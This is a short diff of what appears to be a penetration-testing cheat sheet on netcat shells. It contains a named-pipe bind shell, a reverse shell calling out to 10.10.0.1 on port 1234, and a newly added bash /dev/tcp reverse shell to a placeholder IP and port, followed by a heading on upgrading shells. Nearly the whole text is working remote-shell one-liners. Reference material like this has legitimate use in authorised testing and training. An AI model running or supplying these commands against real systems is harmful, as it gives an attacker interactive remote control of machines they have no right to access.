@@ -31,9 +31,11 @@ mkfifo /tmp/f ; nc -l 1234 < /tmp/f | /bin/bash -i 2>&1 | tee /tmp/f
 On Client:
 nc -l -p 1234
 
-on Remote Server:
+On Remote Server:
 mkfifo /tmp/f; nc 10.10.0.1 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1
 
+or On Remote Server:
+/bin/bash -i > /dev/tcp/<ip>/<port> 2>&1 0<&1
 
 # Getting a better Shell
 If executing bash without the '-i' flag, typical shell features will be lost. Below are several ways to gain a better shell.
